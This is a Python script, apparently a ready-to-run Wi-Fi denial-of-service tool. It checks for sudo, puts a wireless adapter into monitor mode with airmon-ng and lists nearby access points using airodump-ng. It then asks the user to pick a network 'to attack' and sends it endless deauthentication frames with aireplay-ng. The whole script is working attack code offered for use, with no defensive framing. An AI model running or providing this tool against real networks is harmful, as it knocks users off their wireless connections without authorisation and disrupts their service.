#! python3

import subprocess

import re

import csv

import os

import time

import shutil

from datetime import datetime

# Create an empty list
active_wireless_networks = []

# We use this function to test if the ESSID is already in the list file. 
# If so we return False so we don't add it again.
# If it is not in the lst we return True which will instruct the elif 
# statement to add it to the lst.
def check_for_essid(essid, lst):
    check_status = True

    # If no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print(r"""                                                                                               
                                                                           .. .     .  .  .            .                                                           
                                                                        =MMMMMM~MMMMMM=.           .                                                            
                                                           ..M= .. .OMMMMMMMMMMMMMMMMMMMMMO...  ~M                                                              
                                                             .NMMMMMMMMMMMMMMMMDMMMMMMMMMMMMMMMMN,.                                                             
                                                                .NMMMMMMMMMMMM . MMMMMMMMMMMMN                                                                  
                                                                  . .    .     . ..   .      .                                                                  
                                                                                                                                                                
                                                           ..      .  ..                . .,      . .                                                           
                                                            =      ,MM8                 8MM.     .=                                                             
                                                         . M      .MMMMM8            .8MMMMM       M.                                                           
                                                          NM.     +MMMMMMMM  .   ...MMMMMMMM+      MN.                                                          
                                                       ..NMM      MMMMMMMMMMMMMMMMMMMMMMMMMMM.     MMM.                                                         
                                                        .MMM      MMMMMMMMMMMMMMMMMMMMMMMMMMM.     MMM                                                          
                                                        MMMM.     MMMMMMMMMMMMMMMMMMMMMMMMMMM      MMMM                                                         
                                                        MMMM      ?MMMMMMMMZ.    ..$MMMMMMMM?      MMMM,                                                        
                                                       .MMMM       MMMMMMD..     .  .DMMMMMM..     MMMMO                                                        
                                                        MMMM       7MMMD..            .?MMM7       MMMM,                                                        
                                                        .MMMM  .    , .                   :.      MMMM                                                          
                                                       :=~OMMM                            ..     MMMO~=Z.                                                       
                                                        MMMMMM+               MMO             ..+MMMMMM .                                                       
                                                         MMMMMMI .            ,$               .MMMMMM.                                                         
                                                         ,MMMMMM                             . MMMMMM:.                                                         
                                                          :MMMMMM                             MMMMMM,..                                                         
                                                           OMMMMMM .          MMO            MMMMMMO.                                                           
                                                           .MMMMMMM  .        .+           .MMMMMMM.                                                            
                                                             MMMMMMM .          .          MMMMMMM .                                                            
                                                            ..MMMMMMM                   . MMMMMMM..                                                             
                                                              .MMMMMMM..      MMO       .MMMMMMM.                                                               
                                                                MMMMMMM. .   .+N      ..MMMMMMM:.                                                               
                                                                 MMMMMMM,    .        .MMMMMMM ..                                                               
                                                                . MMMMMMM~.         .=MMMMMMM.                                                                  
                                                                   MMMMMMM8..    .  DMMMMMMM                                                                    
                                                                   .MMMMMMMM.      MMMMMMMM.                                                                    
                                                                  . .MMMMMMMM,   ,MMMMMMMM .                                                                    
                                                                    . MMMMMMMM, :MMMMMMMM.                                                                      
                                                                       MMMMMMMMMMMMMMMMM                                                                        
                                                                       .DMMMMMMMMMMMMMN ..                                                                      
                                                                        .MMMMMMMMMMMNM                                                                          
                                                                         .:MMMMMMMMM,                                                                           
                                                                        ... MMMMMMM .                                                                           
                                                                           . MMMMM,                                                                             
                                                                              NMN                                                                               
                                                                                                                                                          
                                                                                                                                                                
                                                                                                       """)
print("\n****************************************************************")
print("\n*                  By gentleman              *")
print("\n*                                                      *")
print("\n* github: https://github.com/max-creator-eng/gentlemandos.git *")
print("\n****************************************************************")


# If the user doesn't run the program with super user privileges, don't allow them to continue.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# Remove .csv files before running the script.
for file_name in os.listdir():
    # We should only have one csv file as we delete them from the folder 
    #  every time we run the program.
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        # We get the current working directory.
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        # Create a timestamp
        timestamp = datetime.now()
        # We move any .csv files in the folder to the backup folder.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex to find wireless interfaces. We're making the assumption they will all be wlan0 or higher.
wlan_pattern = re.compile("^wlan[0-9]+")


check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

# For easy reference we call the selected interface hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Tell the user we're going to kill the conflicting processes.
print("WiFi adapter connected!\nNow let's kill conflicting processes:")


kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitor mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])


discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
try:
    while True:
        
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        
                        csv_h.seek(0)
                        
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                          
                            elif row["BSSID"] == "Station MAC":
                                break
                            
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Ensure that the input choice is valid.
while True:
    # If you don't make a choice from the options available in the list, 
    # you will be asked to please try again.
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# To make it easier to work with and read the code, we assign the results to variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()


subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])


subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])




